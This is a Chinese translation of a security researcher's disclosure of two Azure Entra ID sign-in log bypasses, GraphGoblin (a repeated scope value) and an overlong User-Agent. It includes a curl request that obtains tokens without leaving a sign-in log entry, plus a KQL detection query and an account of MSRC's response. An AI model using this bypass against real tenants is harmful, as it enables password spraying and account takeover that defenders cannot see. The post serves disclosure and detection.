---
layout: post
title: "微软 Azure 又曝登录日志绕过漏洞：GraphGoblin 与第四个漏洞详解"
date: 2026-03-20 21:41:55 +0800
categories: tech-translation
description: "安全研究员发现 Azure Entra ID 的第三和第四个登录日志绕过漏洞，攻击者可以获取有效 Token 而不在日志中留下任何痕迹，微软 MSRC 却将其定性为"中等"严重性。"
original_url: https://trustedsec.com/blog/full-disclosure-a-third-and-fourth-azure-sign-in-log-bypass-found
source: Hacker News
---

本文翻译自 [Full Disclosure: A Third (and Fourth) Azure Sign-In Log Bypass Found](https://trustedsec.com/blog/full-disclosure-a-third-and-fourth-azure-sign-in-log-bypass-found)，原载于 Hacker News。

---

隐形密码喷洒、隐形登录、完整 Token 返回——这不是科幻小说，而是真实存在了三年的 Azure 安全漏洞。

我是 Nyxgeek。2026 年了，我又要和大家分享两个新的 Azure Entra ID 登录日志绕过漏洞。别太激动……这些漏洞最近已经被修复了，但我认为让大家知道这件事非常重要。

通过向 Azure 认证端点发送特制的登录请求，可以在不产生任何 Entra ID 登录日志的情况下获取有效的 Token。这可是**关键日志**——全球管理员都依赖它来检测入侵——这些日志本该是安全防线的基石。

今天我将带你了解我在过去三年中发现的第三个和第四个 Azure 登录日志绕过漏洞，并探讨如何使用 KQL 查询来检测这类绕过。

## 背景：三年四个漏洞

自 2023 年以来，我已经发现了四个 Azure Entra ID 登录日志绕过漏洞。这意味着我找到了**四种完全不同的方法**来验证 Azure 账户密码，而且不会在 Azure Entra ID 登录日志中留下任何记录。

之前两个漏洞（GraphNinja 和 GraphGhost）只能在日志中"隐形"地验证密码是否正确，但我最新的两个绕过漏洞更可怕——它们能返回**完整可用的 Token**。

| **漏洞名称** | **报告时间** | **修复时间** | **描述** |
| --- | --- | --- | --- |
| GraphNinja | 08/2023 | 05/2024 | 通过指定外部租户 ID 作为端点，在不创建日志的情况下验证密码 |
| GraphGhost | 12/2024 | 04/2025 | 通过提供无效的登录参数值，在凭据验证后导致整体认证流程失败 |

这些绕过都针对 Azure Entra ID 登录日志。登录方式是通过 HTTP POST 请求到 Entra ID Token 端点（`login.microsoftonline.com`），使用 OAuth2 ROPC 流程，以 Graph API 作为目标资源/作用域。

一个"正常"的认证请求示例如下：

```bash
curl -X POST "https://login.microsoftonline.com/00000000-1234-1234-1234-000000000000/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" \
  --data-urlencode "client_info=1" \
  --data-urlencode "grant_type=password" \
  --data-urlencode "username=victim@contoso.com" \
  --data-urlencode "password=secretpassword123" \
  --data-urlencode "scope=https://graph.microsoft.com/.default"
```

## GraphGoblin：第三个绕过漏洞

让我们来看看我称之为 **GraphGoblin** 的漏洞。我在测试 Microsoft 认证 POST 请求的各种参数时偶然发现了这个绕过。

测试 `scope` 参数时，我发现如果提供的值不是有效的 scope 名称或格式不匹配，请求会被拒绝：

```
AADSTS70011: The provided request must include a 'scope' input parameter...
```

但这引发了思考：如果我们提交的字符串是**有效的**，但不断重复呢？比如不是 `openid`，而是 `openid openid openid` 重复一万次？

```bash
export TENANT_ID="[tenant-guid-goes-here]"
curl -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" \
  --data-urlencode "client_info=1" \
  --data-urlencode "grant_type=password" \
  --data-urlencode "username=victim@contoso.com" \
  --data-urlencode "password=secretpassword123" \
  --data-urlencode "scope=$(for num in {1..10000}; do echo -n 'openid ';done)"
```

结果：请求通过了，返回了有效 Token，但**登录日志里什么都没有**！

### 为什么会这样？

没有 Microsoft 的官方解释，但我猜测这是一个经典的数据库字段溢出问题。解析器遍历 scope 列表，没有发现无效值，于是尝试将整个 `openid openid openid...` 字符串写入 SQL 表——但字段长度有限制，整个 INSERT 操作失败了。

这是一个常见的初学者错误。关键安全系统的日志模块竟然会有这种基础问题，实在令人担忧。

## 第四个漏洞：超长 User-Agent

还有一个更简单的绕过方法。你能猜到是哪个参数吗？

提示：这个字段经常被自定义；如果你要对关键 Web 认证系统进行 Fuzz 测试，**一定会**测试这个字段。

答案是：**User-Agent** 字段！

秘密就是：让 User-Agent 字符串足够长。50,000 个字符就足够了。没有特殊技巧，就是一个长字符串。

这个漏洞我在 2025 年 9 月 28 日发现，一周后准备写报告时——Microsoft 已经修复了！我不确定他们怎么发现并修复这个问题的，却同时漏掉了 GraphGoblin。

## 时间线

- 2025/9/20 - GraphGoblin 初次发现
- 2025/9/26 - 向 MSRC 披露 GraphGoblin
- 2025/9/28 - 发现第四个漏洞
- 2025/10/8 - Microsoft 在我报告前就修复了第四个漏洞
- 2025/11/7 - Microsoft 无法复现，我制作了视频演示
- 2025/11/21 - 终于复现并开始推出修复
- 2025/12/1 - 重新升级 bounty 和严重性讨论，无变化

## 检测方法：面向未来的解决方案

三年四个登录日志绕过漏洞，对于可以说是 Azure 最重要的日志来说，这可不是好兆头。那么，除了把服务迁回本地，还能做什么？

如果你有 E5 许可证，可以通过 KQL 查询来检测这些绕过。

### KQL 检测规则

我发现 Sign-In 日志和 Graph Activity 日志都有一个 `SessionId` 字段。可以比对 Graph Activity 日志中的 Session ID 和 Sign-In 日志中的 Session ID——只出现在 Graph Activity 日志但不存在于任何 Sign-In 日志的 Session ID，一定是绕过了登录日志。

Fabian Bader 有一篇精彩的博客文章 [Detect threats using Microsoft Graph activity logs - Part 2](https://cloudbrothers.info/en/detect-threats-microsoft-graph-activity-logs-part2/)，专门讲述了如何检测缺失的登录日志。

改进后的 KQL 查询：

```kusto
MicrosoftGraphActivityLogs
| where TimeGenerated > ago(8d)
| join kind=leftanti (union isfuzzy=true
        SigninLogs,
        AADNonInteractiveUserSignInLogs,
        AADServicePrincipalSignInLogs,
        AADManagedIdentitySignInLogs,
        MicrosoftServicePrincipalSignInLogs
    | where TimeGenerated > ago(90d)
    | summarize arg_max(TimeGenerated, *) by UniqueTokenIdentifier
    )
    on $left.SignInActivityId == $right.UniqueTokenIdentifier
```

> **注意**：你需要 E5 许可证才能收集 Graph Activity 日志。

## MSRC 的回应

最令人震惊的是：Microsoft 告诉我，他们认为这不是"重要"级别的问题，只是"中等"安全问题。因此不符合任何认可或奖励条件。

我非常震惊。之前两次登录日志绕过（功能更弱）他们都给了 bounty，而这次能返回**完整 Token** 的绕过却被认为"不重要"。

管理员们，请注意：这就是 Microsoft 看待你组织中最重要的安全日志的方式。

### CVSS 评分

我使用 CVSS v3.1 进行评估：

| **指标** | **评级** | **说明** |
| --- | --- | --- |
| Attack Vector | Network | 通过 HTTP POST |
| Attack Complexity | Low | 用 curl 就能利用 |
| Privileges Required | None | 可隐藏失败和成功的登录日志 |
| User Interaction | None | |
| Scope | Unchanged | |
| Confidentiality | None | |
| **Integrity** | **High** | **关键日志被绕过** |
| Availability | None | |

CVSS v3.1 评分：**7.5（高危）**
CVSS v4.0 评分：**8.7（高危）**

关于 Integrity 指标，CVSS v3.1 文档明确指出：

> "存在完全的完整性丢失...或者只能修改部分文件，但恶意修改会对受影响组件产生**直接、严重的后果**。"

我们通过让日志被省略来修改 Azure Entra ID 登录日志，这确实对受影响组件产生了**直接、严重的后果**。

## 四个漏洞对比

| **名称** | **修复时间** | **返回 Token?** | **积分?** | **Bounty?** |
| --- | --- | --- | --- | --- |
| GraphNinja | 05/2024 | 否 | 否 | **是** |
| GraphGhost | 04/2025 | 否 | **是** | **是** |
| GraphGoblin | 11/2025 | **是** | 否 | 否 |
| Graph****** | 10/2025 | **是** | N/A | N/A |

尽管 GraphGoblin 能获取完整 Token，Microsoft 现在却认为这些不是"重要"级别的问题。

## 个人感想

这些绕过漏洞并不复杂，都是通过简单的 Fuzz 测试发现的。而且被绕过的不是普通日志，而是对整个 Azure 租户安全至关重要的核心日志——它被输入到 SIEM，被用作检测入侵的真相来源。

这些问题是如何引入的？存在了多久？为什么 Microsoft 自己的安全审查没有发现？

几乎整个美国都在使用 Azure，世界许多地方也在使用 Azure。我们集体将信任交付给了 Microsoft 和他们的安全实践。当一个影响如此广泛的问题出现时，我认为 Microsoft 有义务向公众公开。遗憾的是，我们并没有看到这一点。

## 关键要点

1. **Azure 登录日志可能不完整**：在 E5 许可证和高级日志之外，登录日志不能被视为绝对真相来源
2. **实施跨日志检测**：使用 Graph Activity 日志与 Sign-In 日志进行交叉验证
3. **安全测试很重要**：这些漏洞都是通过简单 Fuzz 测试发现的，说明即使是 Microsoft 这样的巨头也可能存在基础安全问题
4. **漏洞赏金计划的不确定性**：MSRC 的评判标准缺乏一致性，同一个类型的问题可能得到完全不同的待遇

---

*本文涉及的技术仅供安全研究和授权测试使用。未经授权对他人系统进行测试是违法行为。*
